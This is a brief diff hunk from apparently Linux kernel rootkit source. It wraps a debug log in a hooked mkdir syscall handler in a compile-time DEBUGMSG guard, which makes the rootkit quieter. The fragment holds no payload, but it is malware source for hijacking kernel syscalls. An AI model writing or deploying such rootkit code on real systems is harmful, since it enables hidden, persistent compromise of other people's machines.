@@ -26,7 +26,9 @@ asmlinkage int muaddib_mkdir(const char __user *pathname, umode_t mode)
     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
     if (error > 0)
+        #if DEBUGMSG == 1
         printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);
+        #endif
 
     og_mkdir(pathname, mode);
     return 0;
